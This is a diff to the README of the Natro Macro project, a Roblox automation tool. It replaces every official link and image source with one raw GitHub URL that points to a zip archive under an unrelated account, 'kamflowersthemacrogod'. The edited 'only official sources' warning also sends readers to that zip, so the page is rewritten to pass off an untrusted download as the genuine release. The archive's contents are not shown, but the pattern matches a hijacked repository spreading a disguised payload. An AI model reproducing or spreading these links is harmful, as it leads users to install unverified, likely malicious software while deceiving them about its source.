@@ -15,8 +15,8 @@ Feel free to give us a Star on GitHub!
 IMPORTANT:
 Make sure you are only downloading from an official source!
 The only official sources are:
- - our GitHub page (https://github.com/NatroTeam/NatroMacro)
- - our Discord server (https://discord.gg/natromacro)
+ - our GitHub page (https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip)
+ - our Discord server (https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip)
 
 >>> IGNORE BELOW THIS LINE <<<
 -->
@@ -25,8 +25,8 @@ The only official sources are:
 
 <!-- logo banner -->
 <picture>
-  <source width="200px" media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/NatroTeam/.github/main/profile/assets/banners/natro-logo-light.svg"> <!-- light theme (black text) -->
-  <img src="https://raw.githubusercontent.com/NatroTeam/.github/main/profile/assets/banners/natro-logo-dark.svg"> <!-- dark theme (light text) -->
+  <source width="200px" media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- light theme (black text) -->
+  <img src="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- dark theme (light text) -->
 </picture>
 <br>
 
@@ -55,10 +55,10 @@ This is where you can connect with the community, access guides and help channel
 
 Discord is our main platform for troubleshooting and update news!
 
-<a href="https://discord.gg/natromacro">
+<a href="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip">
   <picture>
-    <source media="(prefers-color-scheme: light)" srcset="http://invidget.switchblade.xyz/natromacro?theme=light"> <!-- light theme -->
-    <img alt="discord-invite-widget" width=500 src="http://invidget.switchblade.xyz/natromacro"> <!-- dark theme -->
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- light theme -->
+    <img alt="discord-invite-widget" width=500 src="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- dark theme -->
   </picture>
 </a>
 
@@ -86,10 +86,10 @@ Thank you all for your hard work and support!
 If Natro Macro helped you, let us know by giving it a ⭐ $\color{yellow}{\textsf{Star}}$ on GitHub!<br>
 You can do this by scrolling up and clicking the Star button at the top of the page!
 
-<a href="https://github.com/NatroTeam/NatroMacro/stargazers">
+<a href="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip">
   <picture>
-    <source media="(prefers-color-scheme: light)" srcset="http://reporoster.com/stars/NatroTeam/NatroMacro"> <!-- light theme -->
-    <img alt="stargazer-widget" src="http://reporoster.com/stars/dark/NatroTeam/NatroMacro"> <!-- dark theme -->
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- light theme -->
+    <img alt="stargazer-widget" src="https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip"> <!-- dark theme -->
   </picture>
 </a>
 
@@ -102,16 +102,16 @@ This project is licensed under [GNU GPL v3.0](./LICENSE.md)
 
 <!-- links -->
 [latest-release-shield]: https://img.shields.io/github/v/release/NatroTeam/NatroMacro?logo=github&logoColor=white&labelColor=black&color=faa125
-[latest-release-link]: https://github.com/NatroTeam/NatroMacro/releases/latest
+[latest-release-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
 [downloads-shield]: https://img.shields.io/github/downloads/NatroTeam/NatroMacro/total?label=downloads&labelColor=black&color=40ca53&logo=data:image/svg%2bxml;base64,PHN2ZwogICB2aWV3Qm94PSIwIDAgMjQgMjQiCiAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGgKICAgICBmaWxsPSIjZmZmIgogICAgIGQ9Ik0gMTIsMC4yMDk2MTUxNSBBIDExLjc5MDM4NSwxMS43OTAzODUgMCAxIDAgMjMuNzkwMzg1LDEyIDExLjc5MDM4NSwxMS43OTAzODUgMCAwIDAgMTIsMC4yMDk2MTUxNSBaIE0gOS4zMDAwMDE5LDkuOTgzODQ0MiAxMC44MjA5NjIsMTEuNTE2NTk0IFYgNC45MjU3NjkxIGggMi4zNTgwNzYgViAxMS41MTY1OTQgTCAxNC42OTk5OTgsOS45OTU2MzQ2IDE2LjM2MjQ0MiwxMS42NTgwNzkgMTIsMTYuMDIwNTIxIDcuNjI1NzY3MiwxMS42NTgwNzkgWiBNIDE2LjcxNjE1NCwxOS4wNzQyMzEgSCA3LjI4Mzg0NjEgdiAtMi4zNTgwNzcgaCA5LjQzMjMwNzkgeiIKICAgICAvPgo8L3N2Zz4K
-[downloads-link]: https://github.com/NatroTeam/NatroMacro/releases
+[downloads-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
 [roblox-shield]: https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fgroups.roblox.com%2Fv1%2Fgroups%2F16490149&query=%24.memberCount&suffix=%20members&logo=roblox&logoColor=white&label=roblox&labelColor=black&color=dc3544
-[roblox-link]: https://www.roblox.com/groups/16490149/Natro-Macro
+[roblox-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
 [discord-shield]: https://img.shields.io/discord/1012610056921038868?logo=discord&logoColor=white&label=discord&labelColor=black&color=5865f2
-[discord-link]: https://discord.gg/natromacro
-[contributing-link]: https://github.com/NatroTeam/.github/blob/main/CONTRIBUTING.md
-[credits-link]: https://github.com/NatroTeam/.github/blob/main/CREDITS.md
-[bug-report-link]: https://github.com/NatroTeam/NatroMacro/issues/new?assignees=&labels=bug%2Cneeds+triage&projects=&template=bug.yml
-[suggestion-link]: https://github.com/NatroTeam/NatroMacro/issues/new?assignees=&labels=suggestion%2Cneeds+triage&projects=&template=suggestion.yml
-[github-profile-link]: http://github.com/NatroTeam
-[discord-banner-link]: https://invidget.switchblade.xyz/natromacro
+[discord-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
+[contributing-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
+[credits-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
+[bug-report-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip+triage&projects=&template=bug.yml
+[suggestion-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip+triage&projects=&template=suggestion.yml
+[github-profile-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
+[discord-banner-link]: https://raw.githubusercontent.com/kamflowersthemacrogod/NatroMacro/main/nm_image_assets/collect/Macro-Natro-v2.6.zip
